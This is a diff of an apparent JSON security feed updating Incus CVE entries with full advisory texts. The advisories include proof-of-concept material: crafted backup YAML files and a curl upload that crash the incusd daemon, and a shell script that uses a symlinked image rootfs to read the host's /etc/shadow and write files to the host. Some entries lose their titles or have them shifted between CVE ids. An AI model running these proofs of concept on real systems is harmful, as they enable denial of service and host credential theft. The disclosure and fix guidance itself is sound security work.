@@ -381,8 +381,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted)",
+                "description": "## Summary\n\n`(*backend).CreateInstanceFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) contains a nil-pointer dereference that an authenticated user with permission to create instances in any project can trigger remotely by uploading a crafted backup tarball. The Incus daemon panics and the process crashes, causing denial of service to every project on that cluster member.\n\nThis is a sibling of `GHSA-fwj8-62r8-8p8m`, `GHSA-r7w7-mmxr-47r9`, and `GHSA-x5r6-jr56-89pv` (all assigned 2026-05-04). Those patches added guards on adjacent fields of the same `backup/config.Config` struct; the `Volume` field on the instance-import path was missed.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) (current `main`, commit `1513600`):\n\n```go\n// Lines 763-767 \u2014 properly guarded:\nvar volumeConfig map[string]string\nif srcBackup.Config != nil && srcBackup.Config.Volume != nil {\n    volumeConfig = srcBackup.Config.Volume.Config\n}\n\n// ... a few lines later ...\n\n// Line 795 \u2014 unguarded, dereferences Config.Volume directly:\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nThe caller `createFromBackup` in [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) only verifies that `Config` and `Config.Container` are non-nil:\n\n```go\n// instances_post.go:854\nif bInfo.Config == nil || bInfo.Config.Container == nil {\n    return response.BadRequest(errors.New(\"Backup file is missing required information\"))\n}\n```\n\n`Volume` is not checked. The `Volume` field on `internal/server/backup/config.Config` has type `*api.StorageVolume` with `yaml:\"volume,omitempty\"`, so omitting `volume:` from a crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml) decodes to `nil`. The subsequent unguarded deref on line 795 panics.\n\nThe panic happens on the HTTP request goroutine; no `recover()` is installed by `CreateInstanceFromBackup` or its callers, so the Go runtime kills the entire `incusd` process.\n\n## Reach\n\n1. The attacker is any client authenticated to the Incus REST API (TLS client certificate, OIDC, or unix socket) with permission to create instances in at least one project. This is the most common low-trust authenticated user.\n2. The attacker sends `POST /1.0/instances?project=<p>` with `Content-Type: application/octet-stream`.\n3. The body is an uncompressed tar (the same code path also accepts squashfs / gz / zstd / xz) containing one file, [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml), whose `config:` block lists `container:` and `pool:` but omits `volume:`.\n4. [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) `instancesPost` -> `createFromBackup` -> the line 854 guard passes (Container is non-nil) -> `pool.CreateInstanceFromBackup(*bInfo, backupFile, nil)` -> [`internal/server/storage/backend.go:795`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go#L795) panics on `srcBackup.Config.Volume.Config[...]`.\n5. `incusd` process dies. All running operations on that cluster member are killed. Repeated requests = persistent denial of service.\n\nMinimal crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml):\n\n```yaml\nname: poc\nbackend: dir\npool: default\ntype: container\noptimized: false\noptimized_header: false\nconfig:\n  container:\n    name: poc\n    architecture: x86_64\n    type: container\n  pool:\n    name: default\n    driver: dir\n  # volume intentionally absent\n```\n\n## Proof of concept\n\nA self-contained Go unit test imports the real `internal/server/backup/config` package, decodes the crafted YAML into the actual `*backupConfig.Config` struct used by the daemon, and executes the literal expression from [`backend.go:795`](https://github.com/lxc/incus/blob/1513600/backend.go#L795). The test is intentionally inert (panics are recovered and reported as the expected outcome):\n\n```go\n// internal/poc_repro/poc_nil_deref_volume_test.go\nfunc TestPoCNilDerefVolumeImport(t *testing.T) {\n    var bi pocInfo // mirrors internal/server/backup.Info, only Config is needed\n    loader, _ := yaml.NewLoader(strings.NewReader(evilIndex))\n    _ = loader.Load(&bi)\n\n    // bi.Config != nil, bi.Config.Container != nil (passes createFromBackup guard)\n    // bi.Config.Volume == nil (passes the line 765 guard's else branch)\n\n    defer func() { _ = recover() }()\n\n    // Literal copy of backend.go:795.\n    if bi.Config.Volume.Config[\"block.type\"] == \"qcow2\" {\n        // unreachable\n    }\n}\n```\n\nResult against `lxc/incus@1513600` on Go 1.26.1:\n\n```\n=== RUN   TestPoCNilDerefVolumeImport\n    poc_nil_deref_volume_test.go:97: yaml decoded: Container != nil (passes createFromBackup guard), Volume == nil\n    poc_nil_deref_volume_test.go:99: backend.go line 795 unguarded deref about to execute...\n    poc_nil_deref_volume_test.go:123: CONFIRMED: nil-pointer panic at the exact line as backend.go:795 => runtime error: invalid memory address or nil pointer dereference\n--- PASS: TestPoCNilDerefVolumeImport (0.00s)\n```\n\nA tarball builder + uploader (`main.go`) is included in the report's PoC bundle. The tarball is 2560 bytes and contains a single 547-byte [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until the process is restarted by an operator or supervisor.\n- **Privileges required:** authenticated user with `can_create` permission on any project. The path is not behind the admin auth tier.\n- **Network attack surface:** the Incus REST API on `:8443` (or unix socket).\n- **CWE-476** \u2014 nil pointer dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard already present on line 765 a few lines higher into the path that hits line 795. For example:\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Volume == nil {\n    return nil, nil, errors.New(\"Backup config missing required volume metadata\")\n}\n\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nAlternatively, extend the existing `createFromBackup` precondition in [`cmd/incusd/instances_post.go:854`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go#L854) to also reject backups missing `bInfo.Config.Volume`. The latter is the smaller surface change and matches the pattern of `CreateBucketFromBackup` ([`backend.go:7848`](https://github.com/lxc/incus/blob/1513600/backend.go#L7848)):\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Bucket == nil {\n    return errors.New(\"Valid bucket config not found in index\")\n}\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus`. Reporter: tonghuaroot. The reproducer test is non-destructive (no network, no filesystem mutation beyond the temp directory used by Go's test runner) and recovers the panic.",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -394,8 +394,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
+                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -407,19 +407,6 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "severity": "CRITICAL",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "0:6.0.2-1",
-                        "fixed": "0:6.0.4-2+deb13u8"
-                    }
-                ]
-            },
-            "CVE-2026-48751": {
-                "cve_id": "CVE-2026-48751",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -431,10 +418,23 @@
                     }
                 ]
             },
+            "CVE-2026-48751": {
+                "cve_id": "CVE-2026-48751",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "0:6.0.2-1",
+                        "fixed": "0:6.0.4-2+deb13u8"
+                    }
+                ]
+            },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -446,8 +446,8 @@
             },
             "CVE-2026-48753": {
                 "cve_id": "CVE-2026-48753",
-                "title": "[Unknown description]",
-                "description": "[Unknown description]",
+                "title": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
+                "description": "Incus has an arbitrary file write via path traversal in S3 multipart upload in github.com/lxc/incus",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -472,8 +472,8 @@
             },
             "CVE-2026-48755": {
                 "cve_id": "CVE-2026-48755",
-                "title": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
-                "description": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -485,8 +485,8 @@
             },
             "CVE-2026-48756": {
                 "cve_id": "CVE-2026-48756",
-                "title": "Incus: CreateCustomVolumeFromBackup nil-pointer dereference on volume_snapshots[*].expires_at (sibling-field variant of GHSA-r7w7)",
-                "description": "## Summary\n\n`(*backend).CreateCustomVolumeFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `can_create_storage_volumes` permission on any project can crash the `incusd` daemon by uploading a backup tarball whose `volume_snapshots[*].expires_at` field is absent.\n\nThis is a sibling-field variant of GHSA-r7w7-mmxr-47r9 (CVE-2026-40197). Commit `985a1dedf9f3e7ba729c93b654905ed510de25c2` added `if s == nil` at the top of the loop body, but did not guard the adjacent `*snapshot.ExpiresAt` deref 19 lines later. Every other consumer of `Config.VolumeSnapshots[i].ExpiresAt` in this same file already gates the deref with a nil-check \u2014 the asymmetric guard is the bug.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/internal/server/storage/backend.go), `CreateCustomVolumeFromBackup`:\n\n```go\n// Line 7710-7714 \u2014 the parent fix from GHSA-r7w7\nfor _, s := range srcBackup.Config.VolumeSnapshots {\n    if s == nil {\n        return errors.New(\"Bad snapshot definition found in index\")\n    }\n    snapshot := s\n    snapName := snapshot.Name\n    // ...\n    // Line 7731 \u2014 UNGUARDED *time.Time deref:\n    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,\n        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,\n        *snapshot.ExpiresAt,   // <-- panics when expires_at omitted in YAML\n        snapVol.ContentType(), true, true)\n```\n\n`ExpiresAt` is declared `*time.Time` (`shared/api/storage_pool_volume_snapshot.go:21,88`). Every other consumer in the same file already uses the safe pattern:\n\n| Line | Code | Guarded? |\n|------|------|----------|\n| 909-910 | `CreateInstanceFromBackup` | YES |\n| 1134-1135 | refresh path | YES |\n| 1422-1423 | migration path | YES |\n| **7731** | **`CreateCustomVolumeFromBackup`** | **NO** |\n\n## Reach\n\n1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `can_create_storage_volumes` entitlement on any project. Same auth gate as parent GHSA-r7w7.\n2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-Incus-name: <name>`.\n3. Body is a tar containing [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml) with `type: custom`, a non-nil `volume:` block, and `volume_snapshots: [{name: snap0}]` (no `expires_at` field).\n4. `cmd/incusd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the `s == nil` guard at 7712 passes (snapshot pointer is non-nil) -> `*snapshot.ExpiresAt` on line 7731 panics on the nil `*time.Time`.\n5. No `recover()` is installed in the operation runner, so the panic kills the entire `incusd` process. Repeated POSTs are a persistent denial of service.\n\nMinimal [`backup/index.yaml`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backup/index.yaml):\n\n```yaml\nname: poc-vol\nbackend: dir\npool: default\ntype: custom\noptimized: false\noptimized_header: false\nsnapshots: [snap0]\nconfig:\n  volume: {name: poc-vol, type: custom, content_type: filesystem, config: {}}\n  volume_snapshots:\n    - name: snap0\n      description: snap0\n      config: {}\n      # expires_at intentionally omitted\n```\n\n## Proof of concept (end-to-end against running daemon)\n\nBundled in the report: `make_backup.sh` + the resulting 479-byte `poc-vol.tar.gz`.\n\nTested against `incus 7.0.0` (zabbly latest GA at time of report; build `1:0~ubuntu24.04~202605201355`) inside a privileged Ubuntu 24.04 container with the default `dir` storage pool.\n\n```bash\n$ curl -s --unix-socket /var/lib/incus/unix.socket -X POST \\\n    --data-binary @/tmp/poc-vol.tar.gz \\\n    -H 'Content-Type: application/octet-stream' \\\n    -H 'X-Incus-name: poc-vol' \\\n    http://incus/1.0/storage-pools/default/volumes/custom\n{\"type\":\"async\",\"status\":\"Operation created\",\"status_code\":100,...}\n\n$ ps -ef | grep incusd | grep -v grep    # process is GONE\n```\n\nDaemon panic from `/tmp/incus.out`:\n\n```\npanic: runtime error: invalid memory address or nil pointer dereference\n[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x162b938]\n\ngoroutine 422 [running]:\ngithub.com/lxc/incus/v7/internal/server/storage.(*backend).CreateCustomVolumeFromBackup(...)\n    /build/incus/internal/server/storage/backend.go:7731 +0xb48\nmain.createStoragePoolVolumeFromBackup.func7(...)\n    /build/incus/cmd/incusd/storage_volumes.go:2915 +0x290\ngithub.com/lxc/incus/v7/internal/server/operations.(*Operation).Start.func1(...)\n    /build/incus/internal/server/operations/operations.go:307 +0x2c\ncreated by github.com/lxc/incus/v7/internal/server/operations.(*Operation).Start in goroutine 408\n    /build/incus/internal/server/operations/operations.go:306 +0x168\n```\n\nStack frame [`backend.go:7731`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7731) is the literal `*snapshot.ExpiresAt` line. Same line in v6.0.x LTS is [`backend.go:7271`](https://github.com/lxc/incus/blob/985a1dedf9f3e7ba729c93b654905ed510de25c2/backend.go#L7271) (also panics; v6.0.x additionally lacks the `s == nil` parent fix so a single nil snapshot pointer also panics there).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.\n- **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.\n- **Network attack surface:** the Incus REST API on `:8443` or the unix socket.\n- **CWE-476** \u2014 Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard pattern already in use at lines 909-910 / 1134-1135 / 1422-1423:\n\n```diff\n--- a/internal/server/storage/backend.go\n+++ b/internal/server/storage/backend.go\n@@ -7728,9 +7728,14 @@ func (b *backend) CreateCustomVolumeFromBackup(...) error {\n         snapVol := b.GetVolume(drivers.VolumeTypeCustom, drivers.ContentType(srcBackup.Config.Volume.ContentType), snapVolStorageName, snapshot.Config)\n\n         // Validate config and create database entry for new storage volume.\n         // Strip unsupported config keys (in case the export was made from a different type of storage pool).\n-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)\n+        var snapExpiryDate time.Time\n+        if snapshot.ExpiresAt != nil {\n+            snapExpiryDate = *snapshot.ExpiresAt\n+        }\n+\n+        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)\n         if err != nil {\n             return err\n         }\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus` by tonghuaroot.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -511,8 +511,8 @@
             },
             "CVE-2026-55621": {
                 "cve_id": "CVE-2026-55621",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -524,8 +524,8 @@
             },
             "CVE-2026-55622": {
                 "cve_id": "CVE-2026-55622",
-                "title": "security update",
-                "description": "security update",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -916,8 +916,8 @@
             },
             "CVE-2026-47753": {
                 "cve_id": "CVE-2026-47753",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Incus has a Nil-Pointer Dereference Panic via Instance Backup Import (volume omitted)",
+                "description": "## Summary\n\n`(*backend).CreateInstanceFromBackup` in [`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) contains a nil-pointer dereference that an authenticated user with permission to create instances in any project can trigger remotely by uploading a crafted backup tarball. The Incus daemon panics and the process crashes, causing denial of service to every project on that cluster member.\n\nThis is a sibling of `GHSA-fwj8-62r8-8p8m`, `GHSA-r7w7-mmxr-47r9`, and `GHSA-x5r6-jr56-89pv` (all assigned 2026-05-04). Those patches added guards on adjacent fields of the same `backup/config.Config` struct; the `Volume` field on the instance-import path was missed.\n\n## Vulnerable code\n\n[`internal/server/storage/backend.go`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go) (current `main`, commit `1513600`):\n\n```go\n// Lines 763-767 \u2014 properly guarded:\nvar volumeConfig map[string]string\nif srcBackup.Config != nil && srcBackup.Config.Volume != nil {\n    volumeConfig = srcBackup.Config.Volume.Config\n}\n\n// ... a few lines later ...\n\n// Line 795 \u2014 unguarded, dereferences Config.Volume directly:\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nThe caller `createFromBackup` in [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) only verifies that `Config` and `Config.Container` are non-nil:\n\n```go\n// instances_post.go:854\nif bInfo.Config == nil || bInfo.Config.Container == nil {\n    return response.BadRequest(errors.New(\"Backup file is missing required information\"))\n}\n```\n\n`Volume` is not checked. The `Volume` field on `internal/server/backup/config.Config` has type `*api.StorageVolume` with `yaml:\"volume,omitempty\"`, so omitting `volume:` from a crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml) decodes to `nil`. The subsequent unguarded deref on line 795 panics.\n\nThe panic happens on the HTTP request goroutine; no `recover()` is installed by `CreateInstanceFromBackup` or its callers, so the Go runtime kills the entire `incusd` process.\n\n## Reach\n\n1. The attacker is any client authenticated to the Incus REST API (TLS client certificate, OIDC, or unix socket) with permission to create instances in at least one project. This is the most common low-trust authenticated user.\n2. The attacker sends `POST /1.0/instances?project=<p>` with `Content-Type: application/octet-stream`.\n3. The body is an uncompressed tar (the same code path also accepts squashfs / gz / zstd / xz) containing one file, [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml), whose `config:` block lists `container:` and `pool:` but omits `volume:`.\n4. [`cmd/incusd/instances_post.go`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go) `instancesPost` -> `createFromBackup` -> the line 854 guard passes (Container is non-nil) -> `pool.CreateInstanceFromBackup(*bInfo, backupFile, nil)` -> [`internal/server/storage/backend.go:795`](https://github.com/lxc/incus/blob/1513600/internal/server/storage/backend.go#L795) panics on `srcBackup.Config.Volume.Config[...]`.\n5. `incusd` process dies. All running operations on that cluster member are killed. Repeated requests = persistent denial of service.\n\nMinimal crafted [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml):\n\n```yaml\nname: poc\nbackend: dir\npool: default\ntype: container\noptimized: false\noptimized_header: false\nconfig:\n  container:\n    name: poc\n    architecture: x86_64\n    type: container\n  pool:\n    name: default\n    driver: dir\n  # volume intentionally absent\n```\n\n## Proof of concept\n\nA self-contained Go unit test imports the real `internal/server/backup/config` package, decodes the crafted YAML into the actual `*backupConfig.Config` struct used by the daemon, and executes the literal expression from [`backend.go:795`](https://github.com/lxc/incus/blob/1513600/backend.go#L795). The test is intentionally inert (panics are recovered and reported as the expected outcome):\n\n```go\n// internal/poc_repro/poc_nil_deref_volume_test.go\nfunc TestPoCNilDerefVolumeImport(t *testing.T) {\n    var bi pocInfo // mirrors internal/server/backup.Info, only Config is needed\n    loader, _ := yaml.NewLoader(strings.NewReader(evilIndex))\n    _ = loader.Load(&bi)\n\n    // bi.Config != nil, bi.Config.Container != nil (passes createFromBackup guard)\n    // bi.Config.Volume == nil (passes the line 765 guard's else branch)\n\n    defer func() { _ = recover() }()\n\n    // Literal copy of backend.go:795.\n    if bi.Config.Volume.Config[\"block.type\"] == \"qcow2\" {\n        // unreachable\n    }\n}\n```\n\nResult against `lxc/incus@1513600` on Go 1.26.1:\n\n```\n=== RUN   TestPoCNilDerefVolumeImport\n    poc_nil_deref_volume_test.go:97: yaml decoded: Container != nil (passes createFromBackup guard), Volume == nil\n    poc_nil_deref_volume_test.go:99: backend.go line 795 unguarded deref about to execute...\n    poc_nil_deref_volume_test.go:123: CONFIRMED: nil-pointer panic at the exact line as backend.go:795 => runtime error: invalid memory address or nil pointer dereference\n--- PASS: TestPoCNilDerefVolumeImport (0.00s)\n```\n\nA tarball builder + uploader (`main.go`) is included in the report's PoC bundle. The tarball is 2560 bytes and contains a single 547-byte [`backup/index.yaml`](https://github.com/lxc/incus/blob/1513600/backup/index.yaml).\n\n## Impact\n\n- **Severity:** denial of service against the entire `incusd` process. Every container / VM operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until the process is restarted by an operator or supervisor.\n- **Privileges required:** authenticated user with `can_create` permission on any project. The path is not behind the admin auth tier.\n- **Network attack surface:** the Incus REST API on `:8443` (or unix socket).\n- **CWE-476** \u2014 nil pointer dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).\n\n## Suggested fix\n\nMirror the guard already present on line 765 a few lines higher into the path that hits line 795. For example:\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Volume == nil {\n    return nil, nil, errors.New(\"Backup config missing required volume metadata\")\n}\n\nif srcBackup.Config.Volume.Config[\"block.type\"] == drivers.BlockVolumeTypeQcow2 {\n```\n\nAlternatively, extend the existing `createFromBackup` precondition in [`cmd/incusd/instances_post.go:854`](https://github.com/lxc/incus/blob/1513600/cmd/incusd/instances_post.go#L854) to also reject backups missing `bInfo.Config.Volume`. The latter is the smaller surface change and matches the pattern of `CreateBucketFromBackup` ([`backend.go:7848`](https://github.com/lxc/incus/blob/1513600/backend.go#L7848)):\n\n```go\nif srcBackup.Config == nil || srcBackup.Config.Bucket == nil {\n    return errors.New(\"Valid bucket config not found in index\")\n}\n```\n\n## Reporter notes\n\nReported via Privately-Reported Vulnerability against `lxc/incus`. Reporter: tonghuaroot. The reproducer test is non-destructive (no network, no filesystem mutation beyond the temp directory used by Go's test runner) and recovers the panic.",
                 "severity": "MEDIUM",
                 "status": "fixed",
                 "events": [
@@ -929,8 +929,8 @@
             },
             "CVE-2026-48749": {
                 "cve_id": "CVE-2026-48749",
-                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Incus has an arbitrary file read+write on host via rootfs/ symlink in malicious image",
+                "description": "### Summary\n\nA specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates an image as soon as it sees a normal `metadata.yaml` and a `rootfs/` entry, but full extraction can later process a duplicate top-level `rootfs` symlink. Later, the stopped-container file API opens `d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to it.\n\n```\nmetadata.yaml\nrootfs/\nrootfs -> /\n```\n\nIn practice, this allows a malicious actor to access the host's filesystem with root privileges.\n\n\n### PoC\n\nBelow, we map the container's rootfs to `/` on the host, but it can be mapped anywhere. We then retrieve the host's `/etc/shadow` file and create a file in `/`.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC rootfs symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar\n\n# inject rootfs symlink\nrmdir rootfs\nln -s / rootfs\ntar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs\n\n\nincus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink\nincus init afrw-rootfs-symlink afrw-rootfs-symlink\n\n\n# read\nincus file pull afrw-rootfs-symlink/etc/shadow \"${tmpdir}/shadow\"\ncat \"${tmpdir}/shadow\"\n\n# write\nprintf 'afrw-rootfs-symlink\\n' >\"${tmpdir}/afrw-rootfs-symlink\"\nincus file push \"${tmpdir}/afrw-rootfs-symlink\" afrw-rootfs-symlink/\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -942,19 +942,6 @@
             },
             "CVE-2026-48750": {
                 "cve_id": "CVE-2026-48750",
-                "title": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "description": "Incus has an arbitrary file write on host via `exec-output` symlink in crafted image in github.com/lxc/incus",
-                "severity": "CRITICAL",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "0:6.0.2-1",
-                        "fixed": "0:6.0.4-2+deb13u8"
-                    }
-                ]
-            },
-            "CVE-2026-48751": {
-                "cve_id": "CVE-2026-48751",
                 "title": "Title Not Available",
                 "description": "Description Not Available",
                 "severity": "CRITICAL",
@@ -966,10 +953,23 @@
                     }
                 ]
             },
+            "CVE-2026-48751": {
+                "cve_id": "CVE-2026-48751",
+                "title": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "description": "Incus has a restricted project bypass leading to arbitrary command execution in github.com/lxc/incus",
+                "severity": "CRITICAL",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "0:6.0.2-1",
+                        "fixed": "0:6.0.4-2+deb13u8"
+                    }
+                ]
+            },
             "CVE-2026-48752": {
                 "cve_id": "CVE-2026-48752",
-                "title": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
-                "description": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image in github.com/lxc/incus",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "CRITICAL",
                 "status": "fixed",
                 "events": [
@@ -981,8 +981,8 @@
